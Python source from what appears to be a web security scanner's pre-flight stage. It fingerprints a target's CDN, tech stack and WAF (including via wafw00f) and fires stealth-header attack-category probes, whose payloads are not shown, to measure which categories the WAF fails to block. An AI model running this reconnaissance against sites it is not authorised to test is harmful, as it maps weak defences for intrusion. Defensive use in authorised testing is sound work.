def run(target_url: str, timeout: int = 10, logger: Optional[logging.Logger] = None) -> dict:
    result: dict = {
        "target_alive": False,
        "waf_detected": "Unknown",
        "waf_match_reason": "",
        "waf_notes": "",
        "blocking_mode": "Unknown",
        "cdn_detected": "Unknown",
        "tech_stack": [],
        "rate_limit_headers": {},
        "robots_txt": False,
        "sitemap_xml": False,
        "https_enforced": target_url.startswith("https://"),
        "hsts": False,
        "probe_results": [],
    }

    parsed = urlparse(target_url)
    hostname = parsed.hostname or ""
    proxies = get_proxy_dict()

    log(f"[PREFLIGHT] Resolving DNS: {hostname}", "info", logger)
    try:
        socket.getaddrinfo(hostname, None)
    except socket.gaierror as e:
        log(f"[PREFLIGHT] DNS resolution failed: {e}", "error", logger)
        return result

    log(f"[PREFLIGHT] Checking target alive: {target_url}", "info", logger)
    try:
        r = requests.head(
            target_url, timeout=timeout, allow_redirects=True,
            headers=stealth_headers(), proxies=proxies,
        )
        result["target_alive"] = True
        base_headers = dict(r.headers)
    except Exception as e:
        log(f"[PREFLIGHT] Target unreachable: {e}", "error", logger)
        return result

    result["cdn_detected"] = _detect_cdn(base_headers)

    server  = base_headers.get("Server", base_headers.get("server", ""))
    powered = base_headers.get("X-Powered-By", base_headers.get("x-powered-by", ""))
    gen     = base_headers.get("X-Generator", base_headers.get("x-generator", ""))
    for val in (server, powered, gen):
        if val and val not in result["tech_stack"]:
            result["tech_stack"].append(val)

    lower_keys = {k.lower() for k in base_headers}
    if "strict-transport-security" in lower_keys:
        result["hsts"] = True
    for rh in ("X-RateLimit-Limit", "Retry-After", "RateLimit-Limit", "RateLimit-Reset"):
        if rh.lower() in lower_keys:
            result["rate_limit_headers"][rh] = base_headers.get(rh, "")

    for path_check, key in (("/robots.txt", "robots_txt"), ("/sitemap.xml", "sitemap_xml")):
        try:
            cr = requests.get(
                target_url.rstrip("/") + path_check, timeout=timeout,
                headers=stealth_headers(), allow_redirects=True, proxies=proxies,
            )
            result[key] = cr.status_code == 200
        except Exception:
            pass

    # ── wafw00f dedicated fingerprinting ─────────────────────────────────────
    log("[wafw00f] Running dedicated WAF fingerprinter...", "info", logger)
    wafw00f_data = _run_wafw00f(target_url, timeout=min(timeout + 30, 60), logger=logger)
    result["wafw00f"] = wafw00f_data
    if wafw00f_data.get("detected"):
        names = ", ".join(wafw00f_data["waf_names"])
        log(f"  [wafw00f] Detected: {names}", "success", logger)
        console.print(f"  [bold green][wafw00f][/bold green] Detected: [cyan]{names}[/cyan]")
    elif wafw00f_data.get("error"):
        log(f"  [wafw00f] {wafw00f_data['error']}", "warning", logger)
    else:
        console.print("  [dim][wafw00f] No WAF identified by dedicated fingerprinter[/dim]")
    console.print()

    total = len(WAF_PROBES)
    log(f"[PREFLIGHT] Running {total} WAF probe requests ({_PROBE_WORKERS} parallel)...", "info", logger)
    console.print(f"  Firing [bold]{total}[/bold] probes across "
                  f"[bold]{len(set(p['category'] for p in WAF_PROBES))}[/bold] attack categories...\n")

    probe_results: list[dict] = []
    lock = threading.Lock()
    sem  = threading.Semaphore(_PROBE_WORKERS)
    auth = get_basic_auth()

    def _fire(probe: dict) -> None:
        url  = target_url.rstrip("/") + probe["path"]
        hdrs = stealth_headers()
        hdrs.update(probe["headers"])
        with sem:
            try:
                pr = requests.get(
                    url, headers=hdrs, params=probe.get("params", {}),
                    timeout=timeout, allow_redirects=False,
                    proxies=proxies, auth=auth, verify=False,
                )
                entry = {
                    "category":     probe["category"],
                    "probe_name":   probe["name"],
                    "url":          url,
                    "status":       pr.status_code,
                    "blocked":      pr.status_code in BLOCK_CODES,
                    "headers":      dict(pr.headers),
                    "body_snippet": pr.text[:300] if pr.text else "",
                    "error":        None,
                    "timestamp":    now_utc(),
                }
            except Exception as e:
                entry = {
                    "category":     probe["category"],
                    "probe_name":   probe["name"],
                    "url":          url,
                    "status":       0,
                    "blocked":      False,
                    "headers":      {},
                    "body_snippet": "",
                    "error":        str(e),
                    "timestamp":    now_utc(),
                }
        with lock:
            probe_results.append(entry)

    threads = [threading.Thread(target=_fire, args=(p,), daemon=True) for p in WAF_PROBES]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    result["probe_results"] = probe_results

    # ── Per-category detection rates ──────────────────────────────────────────
    from collections import defaultdict
    by_cat: dict[str, list[dict]] = defaultdict(list)
    for entry in probe_results:
        by_cat[entry["category"]].append(entry)

    category_stats: list[dict] = []
    for cat, entries in by_cat.items():
        total_c   = len(entries)
        blocked_c = sum(1 for e in entries if e["blocked"])
        rate      = round(blocked_c / total_c * 100) if total_c else 0
        category_stats.append({
            "category":       cat,
            "total":          total_c,
            "blocked":        blocked_c,
            "detection_rate": rate,
        })
        log(f"  [{cat}] {blocked_c}/{total_c} blocked ({rate}%)", "info", logger)

    result["category_stats"] = category_stats

    waf, waf_reason = _detect_waf(probe_results)
    result["waf_detected"]     = waf
    result["waf_match_reason"] = waf_reason
    result["waf_notes"]        = WAF_SIGNATURES.get(waf, {}).get("notes", "")
    result["blocking_mode"]    = _detect_blocking_mode(probe_results)

    _print_preflight_summary(result)
    return result


def _print_preflight_summary(r: dict) -> None:
    # ── Fingerprint table ─────────────────────────────────────────────────────
    table = Table(
        title="Pre-Flight Security Fingerprint",
        show_header=True, header_style="bold cyan",
    )
    table.add_column("Property",  style="bold white", width=28)
    table.add_column("Value",     style="white")
    table.add_column("Notes",     style="dim",         width=40)

    alive_str = "[bold green]YES[/bold green]" if r["target_alive"] else "[bold red]NO[/bold red]"
    table.add_row("Target Alive", alive_str, "")

    waf   = r["waf_detected"]
    color = "green" if waf == "None detected" else "cyan"
    reason = f"  ({r['waf_match_reason']})" if r.get("waf_match_reason") else ""
    table.add_row(
        "WAF / Bot Protection",
        f"[{color}]{waf}[/{color}]{reason}",
        r.get("waf_notes", ""),
    )

    wafw00f = r.get("wafw00f", {})
    if wafw00f.get("detected"):
        wafw00f_str = ", ".join(wafw00f["waf_names"])
        table.add_row("wafw00f Fingerprint", f"[bold green]{wafw00f_str}[/bold green]",
                      "Dedicated WAF fingerprinter")
    elif wafw00f.get("error"):
        table.add_row("wafw00f Fingerprint", f"[dim]{wafw00f['error']}[/dim]", "")
    else:
        table.add_row("wafw00f Fingerprint", "[dim]None detected[/dim]",
                      "Dedicated WAF fingerprinter")

    mode  = r["blocking_mode"]
    mcolor = "green" if "ACTIVE" in mode else "red"
    table.add_row("Blocking Mode", f"[{mcolor}]{mode}[/{mcolor}]", "")

    cdn   = r["cdn_detected"]
    ccolor = "cyan" if cdn != "None detected" else "dim"
    table.add_row("CDN", f"[{ccolor}]{cdn}[/{ccolor}]", "")

    table.add_row("Tech Stack",   ", ".join(r["tech_stack"]) or "Unknown", "")
    table.add_row("HTTPS",        "Enforced" if r["https_enforced"] else "Not enforced", "")
    table.add_row("HSTS",         "Present" if r["hsts"] else "Missing", "Add Strict-Transport-Security")
    table.add_row("robots.txt",   "Found" if r["robots_txt"] else "Not found", "")
    table.add_row("sitemap.xml",  "Found" if r["sitemap_xml"] else "Not found", "")
    if r["rate_limit_headers"]:
        table.add_row("Rate-Limit Headers", str(r["rate_limit_headers"]), "")

    console.print(table)
    console.print()

    # ── Per-category WAF detection rate table ─────────────────────────────────
    stats = r.get("category_stats", [])
    if not stats:
        return

    total_probes  = sum(s["total"]   for s in stats)
    total_blocked = sum(s["blocked"] for s in stats)
    overall_rate  = round(total_blocked / total_probes * 100) if total_probes else 0

    cat_table = Table(
        title=f"WAF Detection Rate  ({total_blocked}/{total_probes} probes blocked — overall {overall_rate}%)",
        show_header=True, header_style="bold cyan",
    )
    cat_table.add_column("Attack Category",   style="bold white", width=22)
    cat_table.add_column("Probes", justify="right", width=7)
    cat_table.add_column("Blocked", justify="right", width=8)
    cat_table.add_column("Detection Rate", width=20)
    cat_table.add_column("Verdict", width=16)

    for s in sorted(stats, key=lambda x: x["detection_rate"]):
        rate = s["detection_rate"]
        if rate == 0:
            bar_color, verdict = "red",    "CRITICAL — 0%"
        elif rate < 50:
            bar_color, verdict = "yellow", "WEAK"
        elif rate < 80:
            bar_color, verdict = "yellow", "PARTIAL"
        else:
            bar_color, verdict = "green",  "GOOD"

        filled = round(rate / 10)
        bar    = "█" * filled + "░" * (10 - filled)
        cat_table.add_row(
            s["category"],
            str(s["total"]),
            str(s["blocked"]),
            f"[{bar_color}]{bar}[/{bar_color}] {rate}%",
            f"[{bar_color}]{verdict}[/{bar_color}]",
        )

    console.print(cat_table)
    console.print()
